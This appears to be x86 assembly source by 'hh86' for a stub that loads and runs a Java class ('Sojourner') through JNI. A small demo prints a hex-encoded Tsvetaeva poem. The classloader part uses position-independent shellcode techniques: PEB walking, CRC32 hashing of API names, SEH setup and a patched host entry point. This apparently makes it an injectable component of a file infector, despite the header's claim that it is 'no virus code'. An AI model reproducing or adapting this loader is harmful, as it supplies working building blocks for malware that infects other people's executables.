;this is no virus code
;it is used to load and run a Java class file
;hh86

.586
.model  flat, stdcall
include loader.inc

.data
fn              db     "Sojourner.class", 0

.code

assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

code_begin      label    near
        xor     esi, esi
        push    esi
        push    esi
        push    OPEN_EXISTING
        push    esi
        push    esi
        push    GENERIC_READ
        push    offset fn
        call    CreateFile
        xchg    edi, eax 
        push    edi
        push    esi
        push    edi
        call    GetFileSize
        mov     dword ptr [sizeclass + 1], eax
        push    esi
        push    esp
        push    eax
        push    offset classfile
        push    edi
        call    ReadFile
        call    CloseHandle
        push    offset link_text
        pushad
        jmp     offref1

;-------------------------------------------------------------------------------
;here begins code loader code
;-------------------------------------------------------------------------------

classloader     label    near
                                             ;push entrypoint is inserted by the Java code
        pushad
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp + 20h], eax

offref1         label    near
        call    init_seh
        pop     eax
        pop     eax
        pop     esp
        cdq
        pop     dword ptr fs:[edx]
        pop     eax
        popad
        ret

init_seh        label    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      03fc1bd8dh                   ;LoadLibraryA
        db      0

;-------------------------------------------------------------------------------
;if you need to use more than one API, then use GetProcAddress() instead
;-------------------------------------------------------------------------------

        pop     eax
        call    init_javavm

javavmdll       label    near
        db      "jvm", 0
        
classname       label    near
        db      "Sojourner", 0

methodid        label    near
        db      "S", 0

descriptor      label    near
        db      "([B)V", 0

javavm_crc      label    near
        dd      554648e8h                    ;JNI_CreateJavaVM
        db      0

;-------------------------------------------------------------------------------
;initialize Java Virtual Machine
;create byte array to contain the loader code and class file
;then the load class
;-------------------------------------------------------------------------------

rtoff2          label    near
        pop     edx
        push    ecx
        mov     ebp, esp
        push    ecx
        mov     eax, esp
        push    ecx
        push    ecx
        push    ecx
        push    JNI_VERSION_1_6
        push    esp
        push    ebp
        push    eax
        call    edx
        lea     ecx, dword ptr [esi + (offset classfile - offset rtoff2)]
        lea     esi, dword ptr [esi - (offset rtoff2 - offset classname)]
        mov     ebp, dword ptr [ebp]
        mov     ebx, dword ptr [ebp]

sizeclass       label    near
        mov     edx, "hh86"
        push    edx                          ;DefineClass
        push    ecx                          ;DefineClass
        push    eax                          ;DefineClass
        push    esi                          ;DefineClass
        push    ebp                          ;DefineClass
        add     edx, offset classfile - offset classloader
        sub     ecx, offset classfile - offset classloader
        push    ecx                          ;SetByteArrayRegion
        push    edx                          ;SetByteArrayRegion
        push    eax                          ;SetByteArrayRegion
        push    edx
        push    ebp
        call    dword ptr [ebx + NewByteArray]
        xchg    edi, eax
        push    edi
        push    ebp
        call    dword ptr [ebx + SetByteArrayRegion]
        call    dword ptr [ebx + DefineClass]
        push    eax                          ;push at an earlier time
        push    eax

;-------------------------------------------------------------------------------
;GetMethodID() for smaller offset instead of GetStaticMethodID()
;method to be called must not be compiled using "static" keyword, or it must not have ACC_STATIC flag set
;call our method using NewObject()
;-------------------------------------------------------------------------------

        lea     esi, dword ptr [esi + (offset descriptor - offset classname)]
        push    esi
        dec     esi
        dec     esi
        push    esi
        push    eax
        push    ebp
        call    dword ptr [ebx + GetMethodID]
        pop     ecx
        push    edi
        push    eax
        push    ecx
        push    ebp
        call    dword ptr [ebx + NewObject]

;-------------------------------------------------------------------------------
;clean up time
;-------------------------------------------------------------------------------

        add     esp, 10h
        push    ebp
        push    edi
        push    ebp
        push    eax
        push    ebp
        call    dword ptr [ebx + DeleteLocalRef]
        call    dword ptr [ebx + DeleteLocalRef]
        call    dword ptr [ebx + DeleteLocalRef]
        add     esp, sizeof JavaVMInitArgs
        pop     esi
        push    esi
        lods    dword ptr [esi]
        call    dword ptr [eax + DestroyJavaVM]
        int     3

init_javavm     label    near
        call    eax
        add     esi, 6 + offset javavm_crc - offset javavmdll 
        xchg    ebp, eax
        push    esi

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        cdq

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     walk_names
        inc     esi
        jmp     esi

;-------------------------------------------------------------------------------
;use the same constant that is added to sections 
;-------------------------------------------------------------------------------

classfile       label    near
       db       1000h dup (0)
end    code_begin
